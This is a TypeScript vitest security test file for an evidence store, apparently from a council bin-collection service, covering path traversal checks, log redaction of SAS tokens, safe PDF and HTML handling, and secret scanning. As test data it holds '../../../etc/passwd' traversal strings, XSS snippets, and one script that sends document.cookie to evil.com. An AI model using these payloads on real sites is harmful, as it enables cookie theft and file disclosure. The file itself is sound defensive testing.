/**
 * Security Tests - Evidence Safety
 * 
 * Tests evidence storage safety to prevent path traversal,
 * code execution, and credential exposure.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

describe('Security - Evidence Safety', () => {
  let evidenceStore: Map<string, any>;
  let auditLog: any[];

  beforeEach(() => {
    evidenceStore = new Map();
    auditLog = [];
    vi.clearAllMocks();
  });

  const mockLogger = {
    security: vi.fn((entry) => auditLog.push(entry)),
  };

  describe('Path Traversal in Evidence Blob Names', () => {
    it('should reject evidence path with ../ components', () => {
      const validateEvidencePath = (path: string): boolean => {
        // Evidence paths must be UUIDs or content hashes only
        // Never accept user-provided path components
        if (path.includes('..') || path.includes('/') || path.includes('\\')) {
          return false;
        }

        // Only accept UUID or SHA256 format
        const validFormats = [
          /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i, // UUID
          /^[0-9a-f]{64}$/i, // SHA256
        ];

        return validFormats.some(regex => regex.test(path));
      };

      expect(validateEvidencePath('../../../etc/passwd')).toBe(false);
      expect(validateEvidencePath('../../other-adapter/evidence')).toBe(false);
      expect(validateEvidencePath('..\\.\\windows\\system32')).toBe(false);
      expect(validateEvidencePath('a1b2c3d4-5678-90ab-cdef-1234567890ab')).toBe(true);
      expect(validateEvidencePath('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')).toBe(true);
    });

    it('should use content hash for evidence keys, not user input', () => {
      const generateEvidenceKey = (content: Buffer, adapterId: string): string => {
        const crypto = require('crypto');
        const hash = crypto.createHash('sha256').update(content).digest('hex');
        
        // Key format: {adapterId}/{hash}
        // adapterId is from trusted config, not user input
        return `${adapterId}/${hash}`;
      };

      const content = Buffer.from('<html>Evidence content</html>');
      const key = generateEvidenceKey(content, 'eastleigh');

      expect(key).toMatch(/^eastleigh\/[0-9a-f]{64}$/);
      expect(key).not.toContain('..');
      expect(key).not.toContain('\\');
    });

    it('should reject absolute paths in evidence keys', () => {
      const validateEvidencePath = (path: string): boolean => {
        if (path.startsWith('/') || /^[A-Z]:\\/i.test(path)) {
          return false;
        }
        return true;
      };

      expect(validateEvidencePath('/var/app/evidence')).toBe(false);
      expect(validateEvidencePath('C:\\evidence')).toBe(false);
      expect(validateEvidencePath('evidence/file.html')).toBe(true);
    });
  });

  describe('Evidence Content is Raw Bytes - No Execution', () => {
    it('should store HTML evidence as raw bytes, not parse', () => {
      const storeEvidence = (content: string, contentType: string) => {
        const buffer = Buffer.from(content, 'utf-8');
        
        return {
          content: buffer,
          contentType,
          size: buffer.length,
          // Never parse or execute
        };
      };

      const htmlWithScript = '<html><script>alert(1)</script></html>';
      const stored = storeEvidence(htmlWithScript, 'text/html');

      expect(stored.content).toBeInstanceOf(Buffer);
      expect(stored.contentType).toBe('text/html');
      expect(stored.content.toString()).toBe(htmlWithScript);
      
      // Evidence should be stored raw (as Buffer), not parsed into a DOM object
      expect(stored.content).toBeInstanceOf(Buffer);
      expect(stored.content.constructor.name).toBe('Buffer');
    });

    it('should store JSON evidence as raw bytes', () => {
      const storeEvidence = (content: string) => {
        const buffer = Buffer.from(content, 'utf-8');
        
        return {
          content: buffer,
          contentType: 'application/json',
          size: buffer.length,
        };
      };

      const json = '{"malicious": "<script>alert(1)</script>"}';
      const stored = storeEvidence(json);

      expect(stored.content.toString()).toBe(json);
      // Not parsed - still a string in buffer
    });

    it('should store XML evidence as raw bytes', () => {
      const xml = '<?xml version="1.0"?><root><script>alert(1)</script></root>';
      const stored = {
        content: Buffer.from(xml),
        contentType: 'application/xml',
      };

      expect(stored.content.toString()).toBe(xml);
      // Stored as bytes, not parsed XML tree
    });
  });

  describe('Evidence Reference Security', () => {
    it('should not expose storage credentials in audit log', () => {
      const logEvidenceStorage = (evidenceId: string, blobUrl: string) => {
        // Parse Azure Blob URL to extract container/path only
        const parseBlobReference = (url: string): string => {
          const urlObj = new URL(url);
          // Return only path, not SAS token or credentials
          return urlObj.pathname;
        };

        const safeReference = parseBlobReference(blobUrl);

        mockLogger.security({
          event: 'evidence.stored',
          evidenceId,
          reference: safeReference,
          // blobUrl: blobUrl, // NEVER log URL with SAS token
          timestamp: new Date().toISOString(),
        });
      };

      const blobUrl = 'https://binday.blob.core.windows.net/evidence/abc123.html?sv=2021&sig=SECRET_SAS_TOKEN';
      logEvidenceStorage('ev_123', blobUrl);

      const logEntry = auditLog[0];

      expect(logEntry.reference).toBe('/evidence/abc123.html');
      expect(logEntry.reference).not.toContain('sig=');
      expect(logEntry.reference).not.toContain('SECRET');
      expect(logEntry).not.toHaveProperty('blobUrl');
    });

    it('should sanitize evidence URLs before logging', () => {
      const sanitizeUrl = (url: string): string => {
        const urlObj = new URL(url);
        // Remove query string (SAS tokens, credentials)
        return `${urlObj.protocol}//${urlObj.host}${urlObj.pathname}`;
      };

      const urlWithSas = 'https://storage.blob.core.windows.net/container/evidence.html?st=2024&se=2025&sp=r&sig=SECRET';
      const sanitized = sanitizeUrl(urlWithSas);

      expect(sanitized).toBe('https://storage.blob.core.windows.net/container/evidence.html');
      expect(sanitized).not.toContain('sig=');
      expect(sanitized).not.toContain('SECRET');
    });
  });

  describe('PDF Evidence Parsing Safety', () => {
    it('should not execute embedded JavaScript in PDFs', () => {
      const parsePdf = (pdfBuffer: Buffer) => {
        // PDF parsing should extract text only
        // Never execute embedded JavaScript
        
        const mockPdfParser = {
          parse: (buffer: Buffer) => ({
            text: 'Bin collection schedule\nGeneral waste: 2024-04-01',
            metadata: {
              hasJavaScript: true, // Detection flag
            },
          }),
        };

        const parsed = mockPdfParser.parse(pdfBuffer);

        // Log security warning if JS detected
        if (parsed.metadata.hasJavaScript) {
          mockLogger.security({
            event: 'evidence.pdf_javascript_detected',
            severity: 'medium',
            action: 'extracted_text_only',
          });
        }

        return {
          text: parsed.text,
          // Never return or execute JavaScript
        };
      };

      const pdfWithJs = Buffer.from('Mock PDF with embedded JS');
      const result = parsePdf(pdfWithJs);

      expect(result.text).toContain('Bin collection schedule');
      expect(result).not.toHaveProperty('javascript');
      expect(auditLog).toHaveLength(1);
      expect(auditLog[0].event).toBe('evidence.pdf_javascript_detected');
      expect(auditLog[0].action).toBe('extracted_text_only');
    });

    it('should use safe PDF parser configuration', () => {
      const pdfParserConfig = {
        // Safe configuration for PDF parsing
        evaluateXFA: false, // Disable XFA forms (can execute scripts)
        evaluateJavaScript: false, // Disable JavaScript execution
        maxDepth: 10, // Prevent zip bomb style attacks
        maxFileSize: 5 * 1024 * 1024, // 5MB limit
      };

      expect(pdfParserConfig.evaluateJavaScript).toBe(false);
      expect(pdfParserConfig.evaluateXFA).toBe(false);
      expect(pdfParserConfig.maxFileSize).toBeLessThanOrEqual(5 * 1024 * 1024);
    });
  });

  describe('HTML Evidence Safety', () => {
    it('should store HTML evidence raw but never render/execute', () => {
      const storeHtmlEvidence = (html: string) => {
        // Store as-is for debugging/replay
        const buffer = Buffer.from(html);

        return {
          contentType: 'text/html',
          content: buffer,
          metadata: {
            warning: 'Never render this content in a browser',
            viewOnly: 'Use text editor or safe viewer',
          },
        };
      };

      const maliciousHtml = '<html><script>fetch("https://evil.com/steal?data=" + document.cookie)</script></html>';
      const stored = storeHtmlEvidence(maliciousHtml);

      expect(stored.content.toString()).toBe(maliciousHtml);
      expect(stored.metadata.warning).toContain('Never render');
      
      // Verify it's stored as bytes, not DOM
      expect(stored.content).toBeInstanceOf(Buffer);
    });

    it('should serve HTML evidence with Content-Disposition: attachment', () => {
      const serveEvidence = (evidenceId: string) => {
        return {
          headers: {
            'Content-Type': 'text/html',
            'Content-Disposition': 'attachment; filename="evidence.html"',
            'X-Content-Type-Options': 'nosniff',
            'Content-Security-Policy': "default-src 'none'",
          },
          status: 200,
        };
      };

      const response = serveEvidence('ev_123');

      expect(response.headers['Content-Disposition']).toContain('attachment');
      expect(response.headers['X-Content-Type-Options']).toBe('nosniff');
      expect(response.headers['Content-Security-Policy']).toContain("default-src 'none'");
    });
  });

  describe('Evidence Size Limits', () => {
    it('should reject evidence larger than 10MB', () => {
      const validateEvidenceSize = (size: number): boolean => {
        const maxSize = 10 * 1024 * 1024; // 10MB
        return size <= maxSize;
      };

      expect(validateEvidenceSize(1024)).toBe(true);
      expect(validateEvidenceSize(5 * 1024 * 1024)).toBe(true);
      expect(validateEvidenceSize(10 * 1024 * 1024)).toBe(true);
      expect(validateEvidenceSize(11 * 1024 * 1024)).toBe(false);
      expect(validateEvidenceSize(100 * 1024 * 1024)).toBe(false);
    });

    it('should log security warning for oversized evidence', () => {
      const storeEvidence = (content: Buffer) => {
        const maxSize = 10 * 1024 * 1024;

        if (content.length > maxSize) {
          mockLogger.security({
            event: 'evidence.size_exceeded',
            size: content.length,
            maxSize,
            severity: 'medium',
            action: 'rejected',
          });

          return {
            error: 'EVIDENCE_TOO_LARGE',
            maxSize,
          };
        }

        return { success: true };
      };

      const largeContent = Buffer.alloc(15 * 1024 * 1024);
      const result = storeEvidence(largeContent);

      expect(result.error).toBe('EVIDENCE_TOO_LARGE');
      expect(auditLog).toHaveLength(1);
      expect(auditLog[0].event).toBe('evidence.size_exceeded');
      expect(auditLog[0].action).toBe('rejected');
    });
  });

  describe('Evidence Isolation', () => {
    it('should isolate evidence per adapter', () => {
      const getEvidencePath = (adapterId: string, evidenceId: string): string => {
        // Each adapter has separate container/prefix
        return `${adapterId}/evidence/${evidenceId}`;
      };

      const eastleighPath = getEvidencePath('eastleigh', 'ev_123');
      const rushmoirPath = getEvidencePath('rushmoor', 'ev_123');

      expect(eastleighPath).toBe('eastleigh/evidence/ev_123');
      expect(rushmoirPath).toBe('rushmoor/evidence/ev_123');
      expect(eastleighPath).not.toBe(rushmoirPath);
    });

    it('should prevent cross-adapter evidence access', () => {
      const canAccessEvidence = (requestingAdapter: string, evidencePath: string): boolean => {
        // Extract adapter from evidence path
        const pathAdapter = evidencePath.split('/')[0];
        
        // Adapter can only access its own evidence
        return pathAdapter === requestingAdapter;
      };

      expect(canAccessEvidence('eastleigh', 'eastleigh/evidence/ev_123')).toBe(true);
      expect(canAccessEvidence('eastleigh', 'rushmoor/evidence/ev_123')).toBe(false);
      expect(canAccessEvidence('rushmoor', 'rushmoor/evidence/ev_456')).toBe(true);
    });
  });

  describe('Evidence Content-Type Validation', () => {
    it('should validate Content-Type matches file extension', () => {
      const validateContentType = (filename: string, contentType: string): boolean => {
        const extensionMap: Record<string, string[]> = {
          '.html': ['text/html'],
          '.json': ['application/json'],
          '.xml': ['application/xml', 'text/xml'],
          '.pdf': ['application/pdf'],
        };

        const ext = filename.substring(filename.lastIndexOf('.'));
        const allowed = extensionMap[ext] || [];

        return allowed.includes(contentType);
      };

      expect(validateContentType('evidence.html', 'text/html')).toBe(true);
      expect(validateContentType('evidence.json', 'application/json')).toBe(true);
      expect(validateContentType('evidence.html', 'application/pdf')).toBe(false);
      expect(validateContentType('evidence.pdf', 'text/html')).toBe(false);
    });
  });

  describe('Secrets in Evidence', () => {
    it('should scan evidence for potential secrets before storage', () => {
      const scanForSecrets = (content: string): string[] => {
        const secretPatterns = [
          /sk_live_[A-Za-z0-9]{20,}/,
          /hbp_live_[A-Za-z0-9]{20,}/,
          /hbp_test_[A-Za-z0-9]{20,}/,
          /api[_-]?key[=:\s]+[A-Za-z0-9_\-]{16,}/i,
          /password[=:\s]+\S+/i,
          /bearer\s+[a-z0-9]{20,}/i,
          /secret[=:\s]+\S+/i,
        ];

        const findings: string[] = [];

        secretPatterns.forEach((pattern, index) => {
          if (pattern.test(content)) {
            findings.push(`pattern_${index}`);
          }
        });

        return findings;
      };

      const cleanContent = '<html><body>Bin collection: Monday</body></html>';
      expect(scanForSecrets(cleanContent)).toHaveLength(0);

      const suspiciousContent = '<html>api_key=sk_live_abc123def456ghi789</html>';
      expect(scanForSecrets(suspiciousContent).length).toBeGreaterThan(0);
    });

    it('should log warning if potential secrets detected in evidence', () => {
      const storeEvidence = (content: string) => {
        const secretPatterns = [/api[_-]?key/i, /password/i];
        
        secretPatterns.forEach(pattern => {
          if (pattern.test(content)) {
            mockLogger.security({
              event: 'evidence.potential_secret_detected',
              pattern: pattern.toString(),
              severity: 'high',
              recommendation: 'Review evidence content',
            });
          }
        });

        return { stored: true };
      };

      storeEvidence('<html>api_key=secret123</html>');

      expect(auditLog.length).toBeGreaterThan(0);
      expect(auditLog[0].event).toBe('evidence.potential_secret_detected');
      expect(auditLog[0].severity).toBe('high');
    });
  });
});
